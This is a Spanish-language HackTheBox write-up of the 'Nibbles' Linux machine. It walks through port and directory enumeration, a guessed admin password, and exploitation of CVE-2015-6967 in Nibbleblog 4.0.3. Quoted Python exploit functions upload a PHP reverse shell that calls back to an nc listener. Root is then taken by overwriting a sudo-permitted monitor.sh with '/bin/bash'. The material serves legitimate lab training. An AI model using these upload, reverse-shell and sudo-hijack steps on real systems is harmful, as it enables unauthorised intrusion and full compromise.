**Publicado:** 12 de Mayo de 2025 
**Autor:** José Miguel Romero aKa **x3m1Sec** 
**Dificultad:** ⭐ Easy


## 📝 Descripción

Nibbles es una máquina Linux de dificultad fácil en HackTheBox que involucra la explotación de una instalación vulnerable de Nibbleblog 4.0.3. La máquina requiere enumerar un CMS de blog, descubrir credenciales, explotar una vulnerabilidad de carga de archivos arbitrarios (CVE-2015-6967) para conseguir acceso inicial, y finalmente escalar privilegios aprovechando permisos sudo mal configurados en un script bash.

## 🚀 Metodología

```mermaid

flowchart TD
    A[Reconocimiento] --> B[Escaneo de puertos]
    B --> C[Puerto 22 - SSH]
    B --> D[Puerto 80 - HTTP]
    D --> E[Enumeración Web]
    E --> F[Descubrimiento de /nibbleblog]
    F --> G[Fuzzing de directorios]
    G --> H[Enumeración de directorios]
    H --> I[Descubrimiento de panel admin]
    H --> J[Obtención de usuario 'admin']
    I --> K[Login con credenciales\nadmin:nibbles]
    K --> L[Identificación Nibbleblog 4.0.3]
    L --> M[Explotación]
    M --> N[Arbitrary File Upload\nCVE-2015-6967]
    N --> O[Subida de PHP reverse shell]
    O --> P[Ejecución de la shell]
    P --> Q[Acceso como usuario 'nibbler']
    Q --> R[Escalado de privilegios]
    R --> S[Descubrimiento de archivo ZIP]
    S --> T[Extracción de personal.zip]
    T --> U[Edición de monitor.sh]
    U --> V[Ejecución con sudo]
    V --> W[Acceso root]

```



## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
❯ ping -c2 10.10.10.75          
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=52.6 ms
64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=80.0 ms

--- 10.10.10.75 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 52.570/66.301/80.033/13.731 ms
```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.75 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```bash
❯ echo $ports                                        
22,80
```
### Enumeración de servicios

```bash
❯ nmap -sC -sV -p$ports 10.10.10.75 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 19:04 CEST
Nmap scan report for 10.10.10.75
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds

```


---

## 🌐 Enumeración Web

### 80 HTTP 

Enumerando el servicio web del puerto 80 de forma manual, no vemos gran cosa aparte de un mensaje de bienvenida, aunque revisando el código fuente de la página encontramos un comentario en el que se menciona un directorio llamado /nibbleblog


Al acceder a este recurso no vemos gran cosa, aunque buscando algo de información sobre Nibbleblog encontramos que es proyecto de código abierto basado en un CMS para crear blogs de forma sencilla. 


Revisando el código fuente en github hay varios ficheros que nos pueden aportar información sobre la versión:
https://github.com/dignajar/nibbleblog


Gracias al fichero README enumeramos la versión(4.0.3)

http://10.10.10.75/nibbleblog/README


#### 🕷️Fuzzing de directorios

Al realizar fuzzing de directorios usando la herramienta gobuster hallamos algunos ficheros interesantes además de algunos que ya habíamos logrado enumerar de forma manual:

```bash
gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404,502 -x .php, .txt, .xml -r 
```


En el directorio content encontramos un xml con un nombre de usuario `admin`
http://10.10.10.75/nibbleblog/content/private/users.xml
```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
<blacklist type="string" ip="10.10.14.6">
<date type="integer">1747071139</date>
<fail_count type="integer">3</fail_count>
</blacklist>
</users>
```

A continuación accedemos a otro de los recursos encontrado gracias al fuzzing de directorios, el panel de administración:

http://10.10.10.75/nibbleblog/admin.php?controller=user&action=login


Antes de iniciar un ataque de fuerza bruta, probamos el usuario `admin`obtenido en el paso anterior con contraseñas como nibblesblog, nibbleblog, nibbles y obtenemos éxito con esta última:


## 💻 Explotación

Anteriormente enumeramos la versión de este CMS. Una simple búsqueda nos permite saber que vulnerable a Arbitrary FIle Upload

```
searchsploit nibbleblog
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ------------
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                | php/remote/38489.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### 🔓 CVE-2015-6967

La vulnerabilidad de carga de archivos sin restricciones en el complemento My Image en Nibbleblog anterior a 4.0.5 permite a los administradores remotos ejecutar código arbitrario cargando un archivo con una extensión ejecutable y luego accediendo a él mediante una solicitud directa al archivo en content/private/plugins/my_image/image.php.

Existen varios exploits públicos que permiten explotar esta vulnerabilidad:

https://github.com/dix0nym/CVE-2015-6967

En mi caso, solo voy a usar el exploit como referencia para entender lo que está haciendo. Hay una función para login y posteriormente  hay otro par de funciones, una que se encarga de crear o subir un plugin llamado "my_image" adjuntando una shell "nibbles.php" como payload y posteriormente se realiza una llamada a `content/private/plugins/my_image/image.php` para desencadenar la reverse shell:

```python
def upload_shell(session, nibbleURL, payload):
	uploadURL = f"{nibbleURL}admin.php?controller=plugins&action=config&plugin=my_image"
	uploadPostResp = session.post(uploadURL, data={'plugin':'my_image','title':'My image','position':'4','caption':'capton','image_resize':'1','image_width':'230','image_height':'200','image_option':'auto'}, files={'image': ('nibbles.php', payload, 'application/x-php')}, timeout=30)
	if '<b>Warning</b>' in uploadPostResp.text:
		print('[+] Upload likely successfull.')
	else:
		print('[-] Upload likely failed.')

def execute_shell(session, nibbleURL):
	exploitURL = f"{nibbleURL}content/private/plugins/my_image/image.php"
	exploitResp = session.get(exploitURL)

	if exploitResp.status_code == 200:
		print('[+] Exploit launched, check for shell.')
	else:
		print('[!] Exploit failed.')
```


En en este caso el plugin my_image ya existe, así que aprovechando que el módulo de carga de archivos es vulnerable a Arbitrary File Upload y no sanitiza ni valida el tipo de fichero que se carga, voy a subir una php reverse shell de pentestmonkey:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php nibbles.php
```

Después de cambiar la IP y el puerto por el de mi host local, subo la shell


A continuación inicio un listener en el puerto 1234:

```
nc -nlvp 1234
```

Por último realizo la petición a la shell y obtengo la conexión reversa:

http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php


### Mejora de la shell

```bash
script /dev/null -c bash
Crtl +z 
(suspended)
stty raw -echo;fg
reset xterm
export TERM=xterm
```

En nuestro host de ataque
```bash
stty size
```

En el host comprometido
```bash
stty rows X columns Y
```


### Foothold

Accedemos al directorio personal del usuario nibbler y capturamos la primera flag:

```
nibbler@Nibbles:/home/nibbler$ cat user.txt
56be62**************4c0b8bb
nibbler@Nibbles:/home/nibbler$ 
```

### 👑 Escalada de privilegios

Verificamos que el usuario nibbler puede ejecutar el siguiente script como root:

```
nibbler@Nibbles:/usr/share/mdadm$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/usr/share/mdadm$ 
```

En el directorio del usuario nibbler vemos que hay un archivo comprimido sobre el que el únicamente usuario nibbler tiene permisos de lectura:

```
nibbler@Nibbles:/home/nibbler$ ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 May 12 14:02 user.txt
nibbler@Nibbles:/home/nibbler$ 
```

Tras descomprimirlo vemos que hay un script en bash llamado monitor.sh cuyo contenido es el siguiente:

```bash
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```


Dado que tenemos CONTROL TOTAL SOBRE el fichero:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -lah
total 12K
drwxr-xr-x 2 nibbler nibbler 4.0K May 12 14:47 .
drwxr-xr-x 3 nibbler nibbler 4.0K Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler   22 May 12 14:47 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ 
```

Podemos editar el contenido y dejar simplemente una llamada a la bash:

```bash
#!/bin/bash
/bin/bash
```


De tal forma que cuando ejecutemos el script escalaremos privilegios a root y podremos capturar la flag:

```bash
monitor.shbbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh

root@Nibbles:/home/nibbler/personal/stuff# id
uid=0(root) gid=0(root) groups=0(root)
root@Nibbles:/home/nibbler/personal/stuff# cd /root
root@Nibbles:~# cat root.txt
41******2a74329**
root@Nibbles:~# 
```
